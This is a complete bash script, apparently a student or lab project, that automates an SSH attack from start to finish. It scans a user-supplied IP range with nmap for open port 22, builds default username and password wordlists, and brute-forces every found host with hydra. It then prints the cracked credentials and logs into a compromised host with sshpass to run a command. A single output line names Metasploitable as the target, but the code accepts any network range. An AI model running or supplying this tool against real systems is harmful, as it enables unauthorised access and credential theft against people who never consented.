#!/bin/bash

# ========================================
# GhostLogin - Step 1: Input Validation
# ========================================
echo "╔═════════════════════════════╗"
echo "║   Network Range Validator   ║"
echo "╚═════════════════════════════╝"

function validate_ip()
{
    read -p "Enter the IP range or subnet you want to scan: " IP_RANGE   
    
    # Check if input is empty
    if [ -z "$IP_RANGE" ]; then
        echo "[!] ERROR: No IP range entered!"
        echo "[!] EXITING..."
        sleep 3
        exit 1
    fi
         
    # Validate format with nmap
    echo "[*] Checking IP range..."
    CHECK=$(nmap -sL "$IP_RANGE" 2>/dev/null | head -n 2 | tail -n 1 | awk '{print $2}')
    
    # Verify result
    if [ "$CHECK" == "scan" ]; then
        echo "[✓] IP range is valid: $IP_RANGE"
        return 0
    else
        echo "[✗] Invalid IP range"
        echo "[!] Please check your input"
        sleep 2
        exit 1
    fi
}


# ==============================================
# GhostLogin - Step 2: Scanning for SSH Services
# ==============================================

function SCAN()
{
    OUTPUT_FILE=".ssh_ips" # Set output file for hosts with active SSH service

    echo "╔══════════════════════════╗"
    echo "║   SSH SERVICE SCANNER    ║"
    echo "╚══════════════════════════╝"
    echo

    # Check that the IP range variable is set
    if [ -z "$IP_RANGE" ]; then
        echo "[!] ERROR: IP range is not defined."
        return 1
    fi

    echo "[*] Scanning $IP_RANGE for SSH services..."

    # Scan the network ip range and extract all IP addresses
    nmap "$IP_RANGE" -p 22 --open -Pn -oG - 2>/dev/null | awk '/22\/open/ {print $2}' | sort -u > "$OUTPUT_FILE"

    # Check if any hosts were found
    if [ ! -s "$OUTPUT_FILE" ]; then
        echo "[!] No hosts with SSH service were found."
        return 1
    fi
    # Count the number of hosts with SSH enabled and display the results
    COUNT=$(wc -l < "$OUTPUT_FILE")
    echo "[✓] Found $COUNT host(s) with SSH enabled:"
    cat "$OUTPUT_FILE"
}


# ========================================
# Step 3.1 - Credential List Preparation
# ========================================

function PREPARE_LISTS()
{
	echo "╔═════════════════════════════╗"
    echo "║   Credential Brute Forcing  ║"
    echo "╚═════════════════════════════╝"
    echo
    
    echo "[*] Preparing credential lists..." # Display status message

    read -p "Enter path to username list (press Enter for default): " USER_FILE
    # Ask the user for a username list file path

    if [ -z "$USER_FILE" ]; then # If no file was provided, create a default username list
        cat > .ssh_users << EOF
root
admin
user
support
backup
msfadmin
operator
test
guest
sysadmin
service
developer
manager
EOF
        echo "[+] Default username list created"
    else
        if [ -f "$USER_FILE" ]; then  # Check if user file exists
            cp "$USER_FILE" .ssh_users  # Copy custom username list
            echo "[+] Username list loaded from file" 
        else
            echo "[!] Username file not found"
            exit 1
        fi
    fi


    read -p "Enter path to password list (press Enter for default): " PASS_FILE
    # Ask user for password list path
    if [ -z "$PASS_FILE" ]; then
        cat > .ssh_passwords << EOF  # Create default password file
password
admin123
msfadmin
test123
changeme
welcome
123456
12345678
qwerty
letmein
password1
default
admin
EOF
        echo "[+] Default password list created"
    else
        if [ -f "$PASS_FILE" ]; then # Check if password file exists
            cp "$PASS_FILE" .ssh_passwords  # Copy custom password list
            echo "[+] Password list loaded from file"
        else
            echo "[!] Password file not found"
            exit 1
        fi
    fi
}
# ===========================
# Step 3.2 - SSH Brute Force 
# ===========================

function BRUTE()
{
    echo "[*] Starting SSH brute force..." 

    # Check required files
    if [ ! -s .ssh_ips ] || [ ! -s .ssh_users ] || [ ! -s .ssh_passwords ]; then
        echo "[!] Missing input files for Hydra"
        exit 1
    fi

    hydra -L .ssh_users -P .ssh_passwords -M .ssh_ips ssh \
        2>/dev/null | grep "login:" > .ssh_hydra   # Run Hydra SSH attack and save successful logins

    if [ ! -s .ssh_hydra ]; then
        echo "[!] No valid credentials found"
        return 1
    fi

    echo "[✓] Successful login attempts:"
    cat .ssh_hydra

    # Proof of Concept
    SSHIP=$(awk '{print $3}' .ssh_hydra | head -n 1) # Extract IP
    SSHUSER=$(awk '{print $5}' .ssh_hydra | head -n 1) # Extract username
    SSHPASS=$(awk '{print $7}' .ssh_hydra | head -n 1) # Extract password

    echo
    echo "[POC RESULT]" # POC header
    echo "IP: $SSHIP"  # Show IP
    echo "Username: $SSHUSER" # Show username
    echo "Password: $SSHPASS" # Show password
}

# ===========================
# Step 4 - Post Exploitation
# ===========================

function POST_EXPLOIT()
{
    echo
    echo "╔═══════════════════════╗"
    echo "║   Post Exploitation   ║"
    echo "╚═══════════════════════╝"
    echo

    if [ -z "$SSHIP" ] || [ -z "$SSHUSER" ] || [ -z "$SSHPASS" ]; then  # Ensure credentials exist
        echo "[!] Missing SSH credentials – skipping post-exploitation"
        return 1
    fi

    echo "[*] Running post-exploitation command on $SSHIP"  # Inform user about post-exploitation execution
    echo
    echo "[*] Displaying first entry in remote directory:"
    echo
    # Execute a single automated SSH command using discovered credentials
    sshpass -p "$SSHPASS" ssh -o StrictHostKeyChecking=no "$SSHUSER@$SSHIP" "ls | head -n 1" 
    
    if [ $? -eq 0 ]; then  # Check command execution result
        echo
        echo "[✓] Post-exploitation command executed successfully"
    else
        echo
        echo "[!] Post-exploitation command failed"
    fi
}

# ===========================
# Step 5 - Output & Reporting
# ===========================

function REPORTING()
{
    echo
    echo "╔═══════════════════════╗"
    echo "║  Output & Reporting   ║"
    echo "╚═══════════════════════╝"
    echo
    echo "The IPs with ssh on"
    cat  .ssh_ips   

    echo
    echo "The IPs with the found creds"
    cat  .ssh_hydra 
    
    echo
    echo "Target system: Metasploitable (local lab environment)"

    rm .ssh_*           
}

# ===== Execution Flow =====
validate_ip || exit 1
SCAN || exit 1
PREPARE_LISTS || exit 1
BRUTE || exit 1
POST_EXPLOIT || exit 1
REPORTING









